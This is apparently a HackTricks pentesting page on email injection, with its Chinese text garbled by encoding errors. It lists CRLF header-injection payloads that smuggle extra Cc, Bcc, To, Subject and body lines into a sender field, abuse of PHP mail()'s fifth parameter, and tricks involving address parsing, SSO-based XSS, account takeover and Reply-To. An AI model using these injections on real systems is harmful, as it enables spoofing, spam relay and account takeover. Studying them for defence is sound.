# ç”µå­é‚®ä»¶æ³¨å…¥

<figure><img src="../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
ä½¿ç”¨[**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=email-injections)å¯ä»¥è½»æ¾æ„å»ºå’Œ**è‡ªåŠ¨åŒ–å·¥ä½œæµç¨‹**ï¼Œå¹¶ä½¿ç”¨å…¨çƒ**æœ€å…ˆè¿›**çš„ç¤¾åŒºå·¥å…·ã€‚\
ç«‹å³è·å–è®¿é—®æƒé™ï¼š

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=email-injections" %}

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯ï¼Œæˆä¸ºä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWS Red Team Expertï¼‰</strong></a><strong>ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³çœ‹åˆ°æ‚¨çš„**å…¬å¸åœ¨HackTricksä¸­åšå¹¿å‘Š**æˆ–**ä¸‹è½½PDFæ ¼å¼çš„HackTricks**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* è·å–[**å®˜æ–¹PEASS & HackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)ç³»åˆ—
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨**Twitter**ä¸Šå…³æ³¨æˆ‘ä»¬ ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**ã€‚**
* é€šè¿‡å‘[**HackTricks**](https://github.com/carlospolop/hacktricks)å’Œ[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>

## åœ¨å‘é€çš„ç”µå­é‚®ä»¶ä¸­æ³¨å…¥

### åœ¨å‘ä»¶äººå‚æ•°åæ³¨å…¥æŠ„é€å’Œå¯†é€
```
From:sender@domain.com%0ACc:recipient@domain.co,%0ABcc:recipient1@domain.com
```
æ¶ˆæ¯å°†å‘é€åˆ°æ”¶ä»¶äººå’Œæ”¶ä»¶äºº1å¸æˆ·ã€‚

### æ³¨å…¥å‚æ•°
```
From:sender@domain.com%0ATo:attacker@domain.com
```
### æ³¨å…¥ä¸»é¢˜å‚æ•°
```
From:sender@domain.com%0ASubject:This is%20Fake%20Subject
```
### æ›´æ”¹æ¶ˆæ¯æ­£æ–‡

æ³¨å…¥ä¸¤è¡Œæ¢è¡Œç¬¦ï¼Œç„¶åç¼–å†™æ‚¨çš„æ¶ˆæ¯ä»¥æ›´æ”¹æ¶ˆæ¯çš„æ­£æ–‡ã€‚
```
From:sender@domain.com%0A%0AMy%20New%20%0Fake%20Message.
```
### PHP mail() å‡½æ•°åˆ©ç”¨
```bash
# The function has the following definition:

php --rf mail

Function [ <internal:standard> function mail ] {
- Parameters [5] {
Parameter #0 [ <required> $to ]
Parameter #1 [ <required> $subject ]
Parameter #2 [ <required> $message ]
Parameter #3 [ <optional> $additional_headers ]
Parameter #4 [ <optional> $additional_parameters ]
}
}
```
#### ç¬¬5ä¸ªå‚æ•°ï¼ˆ$additional\_parametersï¼‰

è¿™ä¸€éƒ¨åˆ†å°†åŸºäº**å‡è®¾æ”»å‡»è€…æ§åˆ¶è¯¥å‚æ•°æ—¶å¦‚ä½•æ»¥ç”¨**ã€‚

æ­¤å‚æ•°å°†è¢«æ·»åŠ åˆ°PHPç”¨äºè°ƒç”¨äºŒè¿›åˆ¶sendmailçš„å‘½ä»¤è¡Œä¸­ã€‚ä½†æ˜¯ï¼Œå®ƒå°†é€šè¿‡å‡½æ•°`escapeshellcmd($additional_parameters)`è¿›è¡Œæ¶ˆæ¯’ã€‚

åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæ”»å‡»è€…å¯ä»¥**æ³¨å…¥æå–sendmailçš„å‚æ•°**ã€‚

#### /usr/sbin/sendmailå®ç°ä¸­çš„å·®å¼‚

**sendmail**æ¥å£ç”±ç³»ç»Ÿä¸Šå®‰è£…çš„MTAé‚®ä»¶è½¯ä»¶ï¼ˆSendmailã€Postfixã€Eximç­‰ï¼‰æä¾›ã€‚å°½ç®¡å‡ºäºå…¼å®¹æ€§åŸå› ï¼Œ**åŸºæœ¬åŠŸèƒ½**ï¼ˆå¦‚-t -i -få‚æ•°ï¼‰ä¿æŒ**ç›¸åŒ**ï¼Œä½†**å…¶ä»–åŠŸèƒ½å’Œå‚æ•°**æ ¹æ®å®‰è£…çš„MTAè€Œæœ‰å¾ˆå¤§ä¸åŒã€‚

ä»¥ä¸‹æ˜¯sendmailå‘½ä»¤/æ¥å£ä¸åŒæ‰‹å†Œé¡µçš„å‡ ä¸ªç¤ºä¾‹ï¼š

- Sendmail MTA: [http://www.sendmail.org/\~ca/email/man/sendmail.html](http://www.sendmail.org/\~ca/email/man/sendmail.html)
- Postfix MTA: [http://www.postfix.org/mailq.1.html](http://www.postfix.org/mailq.1.html)
- Exim MTA: [https://linux.die.net/man/8/eximReferences](https://linux.die.net/man/8/eximReferences)

æ ¹æ®sendmailäºŒè¿›åˆ¶æ–‡ä»¶çš„**æ¥æº**ï¼Œå·²å‘ç°ä¸åŒçš„é€‰é¡¹å¯ç”¨äºæ»¥ç”¨å®ƒä»¬å¹¶**æ³„æ¼æ–‡ä»¶ç”šè‡³æ‰§è¡Œä»»æ„å‘½ä»¤**ã€‚æŸ¥çœ‹è¯¦æƒ…ï¼š[**https://exploitbox.io/paper/Pwning-PHP-Mail-Function-For-Fun-And-RCE.html**](https://exploitbox.io/paper/Pwning-PHP-Mail-Function-For-Fun-And-RCE.html)

## åœ¨ç”µå­é‚®ä»¶åç§°ä¸­æ³¨å…¥

### ç”µå­é‚®ä»¶ä¸­è¢«å¿½ç•¥çš„éƒ¨åˆ†

ç¬¦å·ï¼š**+ï¼Œ-** å’Œ **{}** åœ¨æå°‘æ•°æƒ…å†µä¸‹å¯ç”¨äºæ ‡è®°ï¼Œå¹¶è¢«å¤§å¤šæ•°ç”µå­é‚®ä»¶æœåŠ¡å™¨å¿½ç•¥

- ä¾‹å¦‚ john.doe+intigriti@example.com â†’ john.doe@example.com

æ‹¬å·ä¸­çš„æ³¨é‡Šï¼ˆï¼‰**åœ¨å¼€å¤´æˆ–ç»“å°¾ä¹Ÿå°†è¢«å¿½ç•¥**

- ä¾‹å¦‚ john.doe(intigriti)@example.com â†’ john.doe@example.com

### ç™½åå•ç»•è¿‡

<figure><img src="../.gitbook/assets/image (812).png" alt="https://www.youtube.com/watch?app=desktop&#x26;v=4ZsTKvfP1g0"><figcaption></figcaption></figure>

### å¼•å·

<figure><img src="../.gitbook/assets/image (626).png" alt="https://www.youtube.com/watch?app=desktop&#x26;v=4ZsTKvfP1g0"><figcaption></figcaption></figure>

### IPåœ°å€

æ‚¨è¿˜å¯ä»¥åœ¨æ–¹æ‹¬å·ä¹‹é—´ä½¿ç”¨IPåœ°å€ä½œä¸ºåŸŸåï¼š

- john.doe@\[127.0.0.1]
- john.doe@\[IPv6:2001:db8::1]

### å…¶ä»–æ¼æ´

![https://www.youtube.com/watch?app=desktop\&v=4ZsTKvfP1g0](<../.gitbook/assets/image (1131).png>)

## ç¬¬ä¸‰æ–¹SSO

### XSS

ä¸€äº›æœåŠ¡å¦‚**github**æˆ–**salesforceå…è®¸**æ‚¨åœ¨**ç”µå­é‚®ä»¶åœ°å€ä¸­åˆ›å»ºXSSè´Ÿè½½**ã€‚å¦‚æœæ‚¨å¯ä»¥**ä½¿ç”¨è¿™äº›æä¾›å•†ç™»å½•å…¶ä»–æœåŠ¡**ï¼Œè€Œè¿™äº›æœåŠ¡**æœªæ­£ç¡®æ¶ˆæ¯’**ç”µå­é‚®ä»¶ï¼Œæ‚¨å¯èƒ½ä¼šå¼•å‘**XSS**ã€‚

### è´¦æˆ·æ¥ç®¡

å¦‚æœ**SSOæœåŠ¡**å…è®¸æ‚¨**åˆ›å»ºå¸æˆ·è€Œæ— éœ€éªŒè¯ç»™å®šçš„ç”µå­é‚®ä»¶åœ°å€**ï¼ˆå¦‚**salesforce**ï¼‰ï¼Œç„¶åæ‚¨å¯ä»¥ä½¿ç”¨è¯¥å¸æˆ·ç™»å½•**ä¿¡ä»»**salesforceçš„ä¸åŒæœåŠ¡ï¼Œæ‚¨å¯ä»¥è®¿é—®ä»»ä½•å¸æˆ·ã€‚\
è¯·æ³¨æ„ï¼ŒsalesforceæŒ‡ç¤ºç»™å®šçš„ç”µå­é‚®ä»¶æ˜¯å¦å·²éªŒè¯ï¼Œå› æ­¤åº”ç”¨ç¨‹åºåº”è€ƒè™‘æ­¤ä¿¡æ¯ã€‚

## å›å¤åœ°å€

æ‚¨å¯ä»¥å‘é€ä¸€å°ç”µå­é‚®ä»¶ï¼Œä½¿ç”¨_**å‘ä»¶äººï¼šcompany.com**_å’Œ_**å›å¤åœ°å€ï¼šattacker.com**_ï¼Œå¦‚æœç”±äºç”µå­é‚®ä»¶æ˜¯ä»**å†…éƒ¨åœ°å€**å‘é€çš„è€Œå‘é€äº†**è‡ªåŠ¨å›å¤**ï¼Œåˆ™**æ”»å‡»è€…**å¯èƒ½èƒ½å¤Ÿ**æ¥æ”¶**è¯¥**å“åº”**ã€‚

## ç¡¬é€€ä¿¡ç‡

æŸäº›æœåŠ¡ï¼Œå¦‚AWSï¼Œå®æ–½äº†ä¸€ä¸ªç§°ä¸º**ç¡¬é€€ä¿¡ç‡**çš„é˜ˆå€¼ï¼Œé€šå¸¸è®¾ç½®ä¸º10%ã€‚è¿™æ˜¯ä¸€ä¸ªå…³é”®æŒ‡æ ‡ï¼Œç‰¹åˆ«æ˜¯å¯¹äºç”µå­é‚®ä»¶ä¼ é€’æœåŠ¡ã€‚å½“è¶…è¿‡æ­¤æ¯”ç‡æ—¶ï¼Œä¾‹å¦‚AWSçš„ç”µå­é‚®ä»¶æœåŠ¡å¯èƒ½ä¼šè¢«æš‚åœæˆ–é˜»æ­¢ã€‚

**ç¡¬é€€ä¿¡**æŒ‡çš„æ˜¯å› ä¸ºæ”¶ä»¶äººåœ°å€æ— æ•ˆæˆ–ä¸å­˜åœ¨è€Œè¢«é€€å›ç»™å‘ä»¶äººçš„ç”µå­é‚®ä»¶ã€‚è¿™å¯èƒ½æ˜¯ç”±äºå„ç§åŸå› ï¼Œä¾‹å¦‚å°†ç”µå­é‚®ä»¶å‘é€åˆ°ä¸å­˜åœ¨çš„åœ°å€ï¼Œä¸å­˜åœ¨çš„åŸŸæˆ–æ”¶ä»¶äººæœåŠ¡å™¨æ‹’ç»æ¥å—**ç”µå­é‚®ä»¶**ã€‚

åœ¨AWSçš„æƒ…å†µä¸‹ï¼Œå¦‚æœæ‚¨å‘é€äº†1000å°ç”µå­é‚®ä»¶ï¼Œå…¶ä¸­æœ‰100å°ç”±äºåŸå› å¦‚åœ°å€æˆ–åŸŸæ— æ•ˆè€Œå¯¼è‡´ç¡¬é€€ä¿¡ï¼Œè¿™æ„å‘³ç€10%çš„ç¡¬é€€ä¿¡ç‡ã€‚è¾¾åˆ°æˆ–è¶…è¿‡æ­¤æ¯”ç‡å¯èƒ½ä¼šè§¦å‘AWS SESï¼ˆç®€å•ç”µå­é‚®ä»¶æœåŠ¡ï¼‰é˜»æ­¢æˆ–æš‚åœæ‚¨çš„ç”µå­é‚®ä»¶å‘é€åŠŸèƒ½ã€‚

ä¿æŒä½ç¡¬é€€ä¿¡ç‡å¯¹äºç¡®ä¿ä¸é—´æ–­çš„ç”µå­é‚®ä»¶æœåŠ¡å’Œç»´æŠ¤å‘ä»¶äººå£°èª‰è‡³å…³é‡è¦ã€‚ç›‘æ§å’Œç®¡ç†é‚®ä»¶åˆ—è¡¨ä¸­ç”µå­é‚®ä»¶åœ°å€çš„è´¨é‡å¯ä»¥æå¤§åœ°å¸®åŠ©å®ç°è¿™ä¸€ç›®æ ‡ã€‚

æœ‰å…³æ›´è¯¦ç»†çš„ä¿¡æ¯ï¼Œå¯ä»¥å‚è€ƒAWSå…³äºå¤„ç†é€€ä¿¡å’ŒæŠ•è¯‰çš„å®˜æ–¹æ–‡æ¡£[AWS SESé€€ä¿¡å¤„ç†](https://docs.aws.amazon.com/ses/latest/DeveloperGuide/notification-contents.html#bounce-types)ã€‚

## å‚è€ƒèµ„æ–™

- [https://resources.infosecinstitute.com/email-injection/](https://resources.infosecinstitute.com/email-injection/)
- [https://exploitbox.io/paper/Pwning-PHP-Mail-Function-For-Fun-And-RCE.html](https://exploitbox.io/paper/Pwning-PHP-Mail-Function-For-Fun-And-RCE.html)
- [https://drive.google.com/file/d/1iKL6wbp3yYwOmxEtAg1jEmuOf8RM8ty9/view](https://drive.google.com/file/d/1iKL6wbp3yYwOmxEtAg1jEmuOf8RM8ty9/view)
- [https://www.youtube.com/watch?app=desktop\&v=4ZsTKvfP1g0](https://www.youtube.com/watch?app=desktop\&v=4ZsTKvfP1g0)

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯ï¼Œæˆä¸ºä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

- å¦‚æœæ‚¨æƒ³åœ¨HackTricksä¸­çœ‹åˆ°æ‚¨çš„**å…¬å¸å¹¿å‘Š**æˆ–**ä¸‹è½½PDFç‰ˆæœ¬çš„HackTricks**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
- è·å–[**å®˜æ–¹PEASS & HackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
- å‘ç°[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[NFTs](https://opensea.io/collection/the-peass-family)æ”¶è—å“
- **åŠ å…¥** ğŸ’¬ [**Discordç¾¤**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤**](https://t.me/peass) æˆ–åœ¨**Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**ä¸Šå…³æ³¨**æˆ‘ä»¬ã€‚
- é€šè¿‡å‘[**HackTricks**](https://github.com/carlospolop/hacktricks)å’Œ[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>

<figure><img src="../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
ä½¿ç”¨[**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=email-injections)å¯ä»¥è½»æ¾æ„å»ºå’Œ**è‡ªåŠ¨åŒ–å·¥ä½œæµç¨‹**ï¼Œä½¿ç”¨å…¨çƒ**æœ€å…ˆè¿›**çš„ç¤¾åŒºå·¥å…·ã€‚\
ç«‹å³è·å–è®¿é—®æƒé™ï¼š

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=email-injections" %}
